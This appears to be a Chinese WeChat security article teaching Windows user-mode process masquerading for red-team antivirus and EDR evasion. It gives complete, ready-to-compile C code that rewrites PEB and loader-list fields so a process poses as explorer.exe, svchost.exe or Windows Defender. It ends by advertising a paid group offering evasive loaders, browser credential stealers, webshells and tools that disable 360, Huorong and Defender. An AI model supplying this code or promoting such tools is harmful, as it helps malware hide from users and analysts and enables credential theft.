---
title: 《Windows红队免杀进阶：R3进程伪装，从原理到代码实战》
url: https://mp.weixin.qq.com/s/mAWmJwwxEDuhQLHyQgjtKA
source: Doonsec's feed
date: 2026-03-22
fetch_date: 2026-03-23T04:21:59.097075
---

# 《Windows红队免杀进阶：R3进程伪装，从原理到代码实战》

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/libkMqMibKDtVhQoOkgJ8vo1R644noKjbH2dhyVneiaHT2GS9AawvibHcOKAbPfqVj92ohzDRcBbNEbX2MtJJh8U2uGfUMPQbAUtdHwNoPR1QzQ/0?wx_fmt=jpeg)

# 《Windows红队免杀进阶：R3进程伪装，从原理到代码实战》

原创

星夜AI安全
星夜AI安全

星夜AI安全

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_jpg/libkMqMibKDtW5x0HzDECcjvhU8Kl21PPxpuTn1ZcBJDkh96AfLn3dJcZHeic4mp5kbPn1bQP9kAdxGD7aqvmNoxiblFicWFFP1apcsv6xNl2wqM/640?wx_fmt=jpeg&from=appmsg)

#

今天带来一节硬核干货：**Windows用户态(R3)进程伪装**。

这是红队免杀、权限维持、对抗EDR的核心技能之一。
学会它，你的程序可以在任务管理器、Process Explorer里“摇身一变”，伪装成 explorer.exe、svchost.exe 等系统进程。

本文从**原理、结构、代码、检测、实战**全链路讲透，建议收藏反复看。

## 一、先搞懂：什么是R3进程伪装？

简单说：
**在Ring3用户态下，修改进程PEB结构，欺骗用户态工具显示假的进程名与路径。**

作用：

* • 绕过基于进程名的白名单检测
* • 伪装成系统进程降低用户警惕
* • 混淆安全分析人员溯源

它不是万能的，但在**对抗用户态检测**时，效果立竿见影。

## 二、核心前置：R0/R3、PEB、TEB 到底是什么？

先把基础概念捋清楚，代码才不懵。

### 1. 权限层级

* • **R0（Ring0）**：内核态，操作系统内核，最高权限
* • **R3（Ring3）**：用户态，普通应用程序运行环境，我们的主战场

### 2. 关键结构体

* • **TEB（Thread Environment Block）**：线程环境块，通过 `fs:[0x30]`(32位) / `gs:[0x60]`(64位) 找到 PEB
* • **PEB（Process Environment Block）**：进程环境块，保存进程路径、命令行、加载模块等信息
* • **Ldr**：加载器数据，管理已加载模块的三条链表

任务管理器显示的“进程路径/命令行”，**本质就是读PEB里的字段**。
改了PEB，它就被骗了。

## 三、PEB结构：我们要改哪几个字段？

进程伪装的核心，就是修改这两个结构：

### 1. RTL\_USER\_PROCESS\_PARAMETERS

里面两个关键成员：

* • `ImagePathName`：进程镜像路径
* • `CommandLine`：命令行参数

### 2. LDR模块链表

三条链表：

* • InLoadOrderModuleList
* • InMemoryOrderModuleList
* • InInitializationOrderModuleList

完美伪装，需要同时修改主模块在链表中的名称。

## 四、实战代码：可直接编译运行（C/C++）

下面是**带详细注释、兼容x86/x64**的完整实现，伪装成 explorer.exe。

（代码块可直接复制到VS/MinGW编译）

```
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

PPEB GetPEB() {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

void SetUnicodeString(PUNICODE_STRING dest, LPCWSTR src) {
    DWORD len = (DWORD)wcslen(src) * sizeof(WCHAR);
    dest->Length = (USHORT)len;
    dest->MaximumLength = (USHORT)(len + sizeof(WCHAR));
    memcpy(dest->Buffer, src, len + sizeof(WCHAR));
}

BOOL MasqueradeProcess(LPCWSTR szFakePath, LPCWSTR szFakeCommandLine) {
    PPEB pPeb = GetPEB();
    if (!pPeb) return FALSE;

    PRTL_USER_PROCESS_PARAMETERS pParams = pPeb->ProcessParameters;
    if (!pParams) return FALSE;

    if (szFakePath)
        SetUnicodeString(&pParams->ImagePathName, szFakePath);
    if (szFakeCommandLine)
        SetUnicodeString(&pParams->CommandLine, szFakeCommandLine);

    PMY_PEB_LDR_DATA pLdr = (PMY_PEB_LDR_DATA)pPeb->Ldr;
    PLIST_ENTRY pListEntry = pLdr->InLoadOrderModuleList.Flink;
    PMY_LDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
        pListEntry, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

    if (szFakePath) {
        SetUnicodeString(&pEntry->FullDllName, szFakePath);
        LPCWSTR pFileName = wcsrchr(szFakePath, L'\\');
        if (pFileName)
            SetUnicodeString(&pEntry->BaseDllName, pFileName + 1);
    }
    return TRUE;
}

int main() {
    printf("PID: %lu\n", GetCurrentProcessId());
    MasqueradeProcess(
        L"C:\\Windows\\explorer.exe",
        L"C:\\Windows\\explorer.exe"
    );
    getchar();
    return 0;
}
```

## 五、怎么验证伪装成功？

用两款神器即可：

### 1. Process Explorer

* • 找到你的PID
* • 看 Image Path / Command Line
* • 已经变成 explorer.exe

### 2. WinDbg 查看PEB

```
!peb
du poi(poi(@$peb+0x20)+0x60)
```

能直接看到你伪造的路径。

## 六、关键认知：R3伪装能骗过谁，骗不过谁？

这是很多新手踩坑的地方，一定要记牢：

### ✅ 可绕过（用户态读取PEB）

* • 任务管理器
* • Process Explorer / Process Hacker
* • GetModuleFileName
* • GetCommandLine

### ❌ 无法绕过（内核态查询）

* • QueryFullProcessImageName
* • ZwQueryInformationProcess
* • EDR内核回调

**结论**：
R3进程伪装是**欺骗层工具**，不是对抗内核检测的银弹。
想彻底绕过内核级检测，需要配合驱动(R0)或其他高级手法。

## 七、实战拓展：你可以这样玩

1. 1. **伪装成系统进程**

```
MasqueradeProcess(
    L"C:\\Windows\\System32\\svchost.exe",
    L"svchost.exe -k netsvcs"
);
```

1. 2. **伪装成安全软件**

```
L"C:\\Program Files\\Windows Defender\\MsMpEng.exe"
```

关注微信公众号后台回复**入群** 即可加入星夜AI安全交流群

## 圈子介绍

现任职于某头部网络安全企业攻防研究部，核心红队成员。2021-2023年间累计参与40+场国家级、行业级攻防实战演练，精通漏洞挖掘、红蓝对抗策略制定、恶意代码分析、内网横向渗透及应急响应等技术领域。在多次大型演练中，主导突破多个高防护目标网络，曾获“最佳攻击手”“突出贡献个人”等荣誉。

已产出的安全工具及成果包括：

* • 多款主流杀软通杀工具（兼容卡巴斯基、诺顿、瑞星、360等终端防护，无感知运行，突破多引擎联合检测）
* • XXByPassBehinder v1.1 冰蝎免杀生成器（定制化冰蝎免杀工具，绕过主流终端防护与EDR动态检测，支持自定义载荷）
* • 哥斯拉二开免杀定制版（二开优化，深度免杀，突破终端防护与EDR检测，适配多场景植入）
* • NeoCS4.9终极版（高级免杀加载工具，强化载荷注入与进程劫持，适配多系统版本，无兼容问题）
* • WinDump\_免杀版（浏览器凭证窃取工具，支持Chrome/Edge/Firefox等主流浏览器，一键提取敏感数据，免杀过防护）\_
* • \_DumpBrowser\_V1\_免杀版（浏览器凭证窃取工具，专攻浏览器密码、Cookie、历史记录提取，免杀性能拉满）
* • fscan二开版（二开优化内网扫描工具，增强指纹精度、弱口令爆破与结果标准化输出，适配复杂内网）
* • RingQ加载器二开版（二开优化免杀加载器，支持Shellcode内存执行，绕过各类终端防护与EDR检测）
* • 多款免杀Webshell集合（覆盖PHP/JSP/ASPX，过主流WAF与终端防护，适配不同Web场景）
* • 免杀360专属加载器（支持Shellcode内存执行，针对性绕过360全系防护检测，无感知运行）
* • 一键Kill 火绒 defender 工具 **HDKiller**（包含源码）
* • win11 一键kill 360工具 **InjectKill**（包含源码）
* • win11 一键kill defender工具**win11\_df-killer**（包含源码）
* • 免杀火绒6.0内存防护加载器**BypassMemLoader**
* • 单文件bypass **360免杀加载器**

后续将不断更新到内部圈子中 欢迎加入圈子

![](https://mmbiz.qpic.cn/mmbiz_png/libkMqMibKDtVa2h3amjRbMAPcGxLPn5oR8awichFVX0eVEwj4VXFr3erJtSyA23YkVhPKgianNx9vTd3AElic4qTwpmJPndYAog33RpOO0JQScs/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/libkMqMibKDtUZYeqpR7flia9nbiccibOKicv9faM55s7BntCPrZG11R2upm0Tkl1DCVRNRa0vQ79RqYiaWq9hDo2S6Y6DQqdxMcJzZNuicT05ibfHO0/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/libkMqMibKDtWHvOV4b968ricfggzgnqVoaLPMHOAaKf62RobicoOYMyj2vmn2qHhbIMzZKnLoqc73iaEom2sP5tX2mlqiaho7j9EtwYtE6AH4Iqk/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_jpg/libkMqMibKDtUAXwbLu3ZVyfPVwZaDu7OOK3DHkA3MPF2rmWHlY2WK8I7kG1V2NPIsfjUibWiamcDbXbicHM1syIjOlPbQe14u5X34GnxenEIM5Q/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/libkMqMibKDtUPaDUFGrK5RzuEtVibJbNIfuwyRR6N3RWclra83LgOpbEwSNd2AVdBeCMlT5eqPjRGMRXNlebptP9k5Ca826phZsiacykrzwMw4/640?wx_fmt=jpeg&from=appmsg)

```
生命的最终奥义，不过就是活得自在罢了
```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/SffY5ZO3R2kDRUZoVyoQSFNmAaYwluEFTjXAgQILjvqxkG8dwdfCP3ia9vzvl09Te62lH6VjoGcL2txzs1NZE4Q/0?wx_fmt=png)

星夜AI安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/SffY5ZO3R2kDRUZoVyoQSFNmAaYwluEFTjXAgQILjvqxkG8dwdfCP3ia9vzvl09Te62lH6VjoGcL2txzs1NZE4Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过